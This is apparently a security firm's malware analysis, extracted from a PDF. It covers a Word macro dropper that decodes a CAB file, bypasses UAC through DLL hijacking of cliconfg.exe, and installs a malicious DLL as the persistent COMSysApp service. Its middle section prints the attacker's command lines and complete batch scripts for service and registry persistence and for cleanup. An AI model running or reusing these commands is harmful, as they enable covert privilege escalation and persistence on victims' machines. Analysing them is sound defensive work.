@@ -1,0 +1,88 @@
+Technical Analysis
+Let’s start with an overview of the attack:
+We continue with the components involved in this operation.
+The malicious Word �le is the beginning of the infection chain and acts as a dropper for two DLL �les. The Word �le
+contains malicious Visual Basic macro code that runs when the document is opened in Word using the Document_Open()
+autoload function. The word �le also contains a Base64-encoded �le (encoded with a custom key) in it that is read,
+decoded, and dropped to the disk by the macro.
+The Document_Open() subroutine implementing the malicious functionality.
+The Visual Basic macro performs the following tasks:
+Opens a handle to the malicious document to read the encoded CAB �le
+Decodes the CAB �le and writes it to the disk at %temp%\setup.cab
+Encoded CAB �le in the Word document.
+Decoding and writing the CAB �le to %temp%.
+The decoded CAB �le in the Visual Basic memory bu�er.
+The CAB �le contains the following �les and functions:
+dll: A malicious DLL used to launch batch �les (used with cliconfg.exe for UAC bypass). The DLL contains the following
+PDB path: D:\Task\MiMul\NTWDBLIB\Release\NTWDBLIB.pdb.
+bat: A batch �le to set up the service COMSysApp, for an x64 system
+bat: A batch �le to set up the service COMSysApp, for an x86 system
+ini: A data �le with Base64-encoded data for connecting to an FTP server. Credentials are encoded in the .ini �le.
+Decoded credential data contained in ipnet.ini.
+dll: The malicious DLL �le run as a service (using svchost.exe). The DLL contains the following PDB path:
+D:\Task\MiMul\FTPCom_vs10\Release\Engine.pdb.
+The macro then extracts the CAB �le into %systemroo%\system32, using either wusa.exe or expand.exe (depending on
+the OS) to again bypass UAC prompts
+Once the �les have been extracted, the Visual Basic macro deletes the CAB �le and runs the malicious NTWDBLIB.dll via
+cliconfg.exe (to gain privileges and bypass UAC protections)
+Command lines used by the Visual Basic macro:
+cmd /c wusa %TEMP%\setup.cab /quiet /extract:%SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe
+cmd /c expand %TEMP%\setup.cab -F:* %SystemRoot%\System32 && del /f /q %TEMP%\setup.cab && cliconfg.exe
+A combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is a familiar attack on Windows.
+UAC bypass via DLL hijacking requires:
+A Windows executable with the auto-elevate property in its manifest
+A Windows executable in a secure directory (%systemroot%\system32)
+The malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of
+the two batch �les contained in the CAB �le (which is also dropped to %systemroot%\system32):
+NTWDBLIB executing the installer batch �les under the context of cliconfg.exe.
+The batch �les involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll. The contents of
+the batch �les vary depending on the OS (x64 vs x86):
+install1.bat (x64)
+@echo o�
+sc stop COMSysApp
+sc con�g COMSysApp type= own start= auto error= normal binpath= "%windir%\SysWOW64\svchost.exe -k COMSysApp"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v COMSysApp /t REG_MULTI_SZ /d "COMSysA
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%
+sc start COMSysApp
+del /f /q %windir%\SysWOW64\install2.bat
+del /f /q %windir%\SysWOW64\install1.bat
+install2.bat (x86)
+@echo o�
+sc stop COMSysApp
+sc con�g COMSysApp type= own start= auto error= normal binpath= "%windir%\System32\svchost.exe -k COMSysApp"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v COMSysApp /t REG_MULTI_SZ /d "COMSysA
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\COMSysApp\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%windir%
+sc start COMSysApp
+del /f /q %windir%\System32\install1.bat
+del /f /q %windir%\System32\install2.bat
+The batch �les perform these tasks:
+Stop the service COMSysApp
+Con�gure the service to autostart (to set up persistence on the system)
+Modify registry keys to launch the DLL unser svchost.exe
+Specify the malicious DLL path to be loaded into the svchost process.
+Immediately restart the service
+Remove the batch �les to reduce the �ngerprint on the system
+IPNet.dll runs as a service under svchost.exe.
+The malicious DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious NTWDBLIB.dll
+using:
+cmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL
+All the following capabilities described are implemented by the malicious service DLL implant unless speci�ed.
+Variant using North Korean Red Cross
+Another variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious Word dropper uses the same
+Base64-decoding scheme with a di�erent custom key. This document was created January 10.
+Contents of the decoy document.
+This variant also consists of two CAB �les that are dropped to %temp%, depending on the OS (x86 or x64).
+The key di�erences in this variant:
+Two CAB �les are encoded into the Word document in text boxes instead of being appended in the DOC �le
+There is one CAB �le for an x86 system and another for an x64 system
+This malware sample uses uacme.exe with dummy.dll to implement the UAC bypass
+exe is the program vulnerable to the UAC bypass attack
+dll runs install.bat to set up the service (same as NTWDBLIB.dll)
+exe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS. Ipnet.dll may also be either 64-bit or 32-bit.
+The Visual Basic macro uses the following command line:
+cmd /c expand %TEMP%\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe
+The control server credential information contained in the CAB �les is di�erent:
+Decoded credential data contained in another ipnet.ini.
+Similarities between this variant and the original malware sample:
+Service name is the same: COMSysApp
+The DLL and ini �les contain the same functions as described elsewhere in this post
